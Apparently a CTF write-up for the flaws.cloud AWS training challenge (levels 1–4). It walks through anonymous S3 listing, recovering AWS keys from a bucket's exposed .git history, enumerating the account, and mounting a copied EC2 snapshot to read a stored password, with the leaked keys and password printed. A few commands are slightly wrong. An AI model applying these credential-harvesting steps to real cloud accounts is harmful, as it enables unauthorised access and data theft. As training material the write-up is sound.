# Flaws

## Level 1
 
Use the command 

    $nslookup flaws.cloud 

to find the ip  address of the aws server flaws.cloud

Resultant ips :  

    Name:   flaws.cloud
    Address: 52.92.192.211
    Name:   flaws.cloud
    Address: 52.218.181.178
    Name:   flaws.cloud 
    Address: 52.218.153.82
    Name:   flaws.cloud
    Address: 52.92.249.155
    Name:   flaws.cloud
    Address: 52.218.229.98
    Name:   flaws.cloud
    Address: 52.218.196.163
    Name:   flaws.cloud
    Address: 52.92.181.83
    Name:   flaws.cloud
    Address: 52.218.240.99
Reverse lookup on the ip results on 
    
    name = s3-website-us-west-2.amazonaws.com
Using the command :

    $nslookup 52.218.181.178
    
Using the command:

    $aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
    
list the root files on the flaws.cloud as an anonymous id.

Result:

    2017-03-14 08:30:38       2575 hint1.html
    2017-03-03 09:35:17       1707 hint2.html
    2017-03-03 09:35:11       1101 hint3.html
    2020-05-22 23:46:45       3162 index.html
    2018-07-10 22:17:16      15979 logo.png
    2017-02-27 07:29:28         46 robots.txt
    2017-02-27 07:29:30       1051 secret-dd02c7c.html
    
    
Browse 

    https://flaws.cloud/secret-dd02c7c.html
    
to get into the next level

Link for the next level: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    
## Level 2

Create an account in aws as with free tier.

Create a Iam user with access key and secret access key after creating the account.

After creating the user try enquiring or list the root directory as a verified user from the terminal after setting the aws cli with access key and secret access key.

command for listing:

    $aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
   
Output be like:

    2017-02-27 07:32:15      80751 everyone.png
    2017-03-03 09:17:17       1433 hint1.html
    2017-02-27 07:34:39       1035 hint2.html
    2017-02-27 07:32:14       2786 index.html
    2017-02-27 07:32:14         26 robots.txt
    2017-02-27 07:32:15       1051 secret-e4443fc.html
    
After getting the result browse the secret file and you will get the link for the next level: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
    
## Level 3

To list the root dir files use the command:


    $aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
output:

                                PRE .git/
    2017-02-27 05:44:33     123637 authenticated_users.png
    2017-02-27 05:44:34       1552 hint1.html
    2017-02-27 05:44:34       1426 hint2.html
    2017-02-27 05:44:35       1247 hint3.html
    2017-02-27 05:44:33       1035 hint4.html
    2020-05-22 23:51:10       1861 index.html
    2017-02-27 05:44:33         26 robots.txt

Here we can a see a .git file, 

For accessing the git commands, we sync it with our local system using the command:
 
    $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./flaws

Navigate into that directory using the command:

    $cd flaws

After that, for finding access and secret key, we can use the command
     
     $git logs
     
output:

    commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:43 2017 -0600

        Oops, accidentally added something I shouldn't have

    commit f52ec03b227ea6094b04e43f475fb0126edb5a61
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:07 2017 -0600

        first commit
To change branch that was mentioned in the commit, follow the command

    $ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
You will be switched to the new branch were you will get a file named access_keys.txt which contains the access keys.

Output:

    access_key AKIAJ366LIPB4IJKT7SA
    secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys

Configure your aws with this keys along with the region us-west-2

Then run:
   
    $aws s3 ls
    
Output:

     2020-06-25 23:13:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
     2020-06-27 04:36:07 config-bucket-975426262029
     2020-06-27 16:16:15 flaws-logs
     2020-06-27 16:16:15 flaws.cloud
     2020-06-27 20:57:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
     2020-06-27 20:57:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
     2020-06-27 20:57:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
     2020-06-27 20:57:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
     2020-06-27 20:57:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
     2020-06-28 07:59:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
     
     
We get the links to complete all the levels.

Link for level 4: https://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

## Level 4

For this level, we need to get access to the web page running on an EC2 at:http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

We are going to collect the snapshot running on the ec2 instance and clone it into our new EC2 instance.

### Getting the snapshot in the flaws instance.

we need the account ID, which we can get using the AWS key from the previous level:

    $aws --profile flaws sts get-caller-identity

Output:

    {
        "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
        "Account": "975426262029",
        "Arn": "arn:aws:iam::975426262029:user/backup"
    }
    
Using the command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s.

Next, discover the snapshot:

    $aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029

Output:

     {
         "Snapshots": [
             {
                 "Description": "",
                 "Encrypted": false,
                 "OwnerId": "975426262029",
                 "Progress": "100%",
                 "SnapshotId": "snap-0b49342abd1bdcb89",
                 "StartTime": "2017-02-28T01:35:12.000Z",
                 "State": "completed",
                 "VolumeId": "vol-04f1c039bc13ea950",
                 "VolumeSize": 8,
                 "Tags": [
                     {
                         "Key": "Name",
                         "Value": "flaws backup 2017.02.27"
                     }
                 ],
                 "StorageTier": "standard"
             }
         ]
     }

Now that you know the snapshot ID, you're going to want to mount it. You'll need to do this in your own AWS account.

First, create a volume using the snapshot:

     $aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89

Create an EC2 instance in your aws account in the us-west-2 region and in the storage options, choose the volume you just created.

The ssh private keys you have generated while hosting the instance is the way of login towards the ssh server.

After getting the ssh keys change the file permissions using:
   
    $chmod 400 YOUR_KEY.pem

Use the command to login:
 
     $ssh -i YOUR_KEY.pem  username@host

After login try the command:

      $df -h
This will returns the prompt:

     Filesystem      Size  Used Avail Use% Mounted on
     devtmpfs        4.0M     0  4.0M   0% /dev
     tmpfs           475M     0  475M   0% /dev/shm
     tmpfs           190M  2.8M  188M   2% /run
     /dev/xvda1      8.0G  1.5G  6.5G  19% /
     tmpfs           475M     0  475M   0% /tmp
     tmpfs            95M     0   95M   0% /run/user/1000

We need to mount the volume /dev/xvda1 as /dev/xvdb1 on /mnt

For that we use the command:

     $sudo mount /dev/xvdb1 /mnt

After mounting, navigate to /mnt/home/ubuntu/
The list of that dir contains:
    
     meta-data  setupNginx.sh
Use $cat command to view the files

We will get:

     htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
     
From the file setupNginx.sh

uname: flaws    pass: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

Use the credentials to logon to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud



Link for level 5: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/



